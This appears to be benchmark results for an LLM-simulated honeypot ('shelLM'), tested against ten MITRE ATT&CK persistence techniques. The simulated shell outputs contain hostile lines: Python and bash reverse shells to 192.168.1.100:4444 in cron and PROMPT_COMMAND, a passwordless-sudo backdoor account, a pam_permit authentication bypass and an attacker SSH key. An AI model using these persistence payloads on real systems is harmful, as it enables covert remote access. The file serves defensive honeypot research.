@@ -1,0 +1,229 @@
+{
+  "baseline": "shelLM",
+  "mode": "wexpect_direct",
+  "test_time": "2026-01-23T15:57:31.883406",
+  "num_rounds": 1,
+  "scenarios_per_round": 10,
+  "per_round_metrics": [
+    {
+      "round_number": 1,
+      "spr": 0.9,
+      "sfr": 0.8,
+      "pdr_high": 1.0,
+      "pdr_medium": 0.75,
+      "pdr_low": 0.5,
+      "avg_latency_ms": 7380.217981338501,
+      "total_tokens": 791586,
+      "total_scenarios": 10,
+      "passed_scenarios": 8
+    }
+  ],
+  "aggregated_metrics": {
+    "spr": {
+      "mean": 0.9,
+      "std": 0.0,
+      "min": 0.9,
+      "max": 0.9
+    },
+    "sfr": {
+      "mean": 0.8,
+      "std": 0.0,
+      "min": 0.8,
+      "max": 0.8
+    },
+    "pdr_high": {
+      "mean": 1.0,
+      "std": 0.0,
+      "min": 1.0,
+      "max": 1.0
+    },
+    "pdr_medium": {
+      "mean": 0.75,
+      "std": 0.0,
+      "min": 0.75,
+      "max": 0.75
+    },
+    "pdr_low": {
+      "mean": 0.5,
+      "std": 0.0,
+      "min": 0.5,
+      "max": 0.5
+    },
+    "latency_ms": {
+      "mean": 7380.218,
+      "std": 0.0,
+      "min": 7380.218,
+      "max": 7380.218
+    },
+    "total_tokens": {
+      "mean": 791586.0,
+      "std": 0.0,
+      "min": 791586.0,
+      "max": 791586.0
+    }
+  },
+  "per_round_results": [
+    [
+      {
+        "scenario_id": "HC-T1053-003",
+        "mitre_id": "T1053.003",
+        "technique": "Scheduled Task/Job: Cron",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "crontab: installing new crontab\nroot@honeypot:~",
+        "verify_response": "*/15 * * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"192.168.1.100\",4444));subprocess.call([\"bash\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\nroot@honeypot-51:~",
+        "implant_latency_ms": 5382.132768630981,
+        "verify_latency_ms": 7738.800764083862,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1543-002",
+        "mitre_id": "T1543.002",
+        "technique": "Create or Modify System Process: Systemd Service",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "> [Unit]\n> Description=Network Name Resolution\n> Documentation=man:systemd-resolved.service(8)\n> Requires=systemd-resolved.service\n> After=systemd-resolved.service\n> \n> [Service]\n> Type=dbus\n> BusName=org.freedesktop.resolve1\n> ExecStart=/usr/lib/systemd/systemd-resolved\n> WatchdogSec=3min\n> Restart=always\n> \n> [Install]\n> WantedBy=multi-user.target\n> EOF\nroot@honeypot-52:~",
+        "verify_response": "enabled\nroot@honeypot-53:~",
+        "implant_latency_ms": 9216.407299041748,
+        "verify_latency_ms": 6164.258003234863,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1098-004",
+        "mitre_id": "T1098.004",
+        "technique": "Account Manipulation: SSH Authorized Keys",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "root@server-01:~",
+        "verify_response": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fake... c2server@attacker\nroot@ubuntu-server:~",
+        "implant_latency_ms": 5308.2568645477295,
+        "verify_latency_ms": 6978.249549865723,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1136-001",
+        "mitre_id": "T1136.001",
+        "technique": "Create Account: Local Account",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "root@debian-honeypot:~",
+        "verify_response": "uid=1001(sysupdate) gid=1001(sysupdate) groups=1001(sysupdate),27(sudo)\nsysupdate:x:1001:1001:System Service Account:/home/sysupdate:/bin/bash\nUser sysupdate may run the following commands on prod-server-02:\n    (ALL) NOPASSWD: ALL\nroot@prod-server-02:~",
+        "implant_latency_ms": 5641.958951950073,
+        "verify_latency_ms": 7943.820476531982,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1546-004",
+        "mitre_id": "T1546.004",
+        "technique": "Event Triggered Execution: Unix Shell Configuration Modification",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "root@ubuntu-honeypot:~",
+        "verify_response": "export PROMPT_COMMAND=\"(nohup bash -c \\\"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\\\" &)\"\nroot@honeypot-54:~",
+        "implant_latency_ms": 6514.718055725098,
+        "verify_latency_ms": 8374.696969985962,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1037-004",
+        "mitre_id": "T1037.004",
+        "technique": "Boot or Logon Initialization Scripts: RC Scripts",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "root@prod-srv-03:~",
+        "verify_response": "",
+        "implant_latency_ms": 6160.386562347412,
+        "verify_latency_ms": 10199.997663497925,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1505-003",
+        "mitre_id": "T1505.003",
+        "technique": "Server Software Component: Web Shell",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "root@ubuntu-srv-05:~",
+        "verify_response": "<?php if(isset(",
+        "implant_latency_ms": 7236.236572265625,
+        "verify_latency_ms": 8956.045150756836,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1574-006",
+        "mitre_id": "T1574.006",
+        "technique": "Hijack Execution Flow: Dynamic Linker Hijacking",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "root@honeypot-55:~",
+        "verify_response": "/usr/local/lib/libsystem.so\n-rw-r--r-- 1 root root 0 Jan 23 15:56 /usr/local/lib/libsystem.so\nroot@ubuntu-honeypot-01:~",
+        "implant_latency_ms": 6491.601467132568,
+        "verify_latency_ms": 9051.173448562622,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1556-003",
+        "mitre_id": "T1556.003",
+        "technique": "Modify Authentication Process: Pluggable Authentication Modules",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "root@server-ubuntu:~",
+        "verify_response": "auth sufficient pam_permit.so\nroot@prod-srv-07:~",
+        "implant_latency_ms": 7089.797258377075,
+        "verify_latency_ms": 7293.959140777588,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1078-003",
+        "mitre_id": "T1078.003",
+        "technique": "Valid Accounts: Local Accounts",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "root@honeypot-56:~",
+        "verify_response": "nobody:x:65534:65534:nobody:/nonexistent:/bin/bash\nUser nobody may run the following commands on ubuntu-honeypot-02:\n    (ALL) NOPASSWD: ALL\nroot@ubuntu-honeypot-02:~",
+        "implant_latency_ms": 6779.459476470947,
+        "verify_latency_ms": 9082.403182983398,
+        "error": null
+      }
+    ]
+  ]
+}
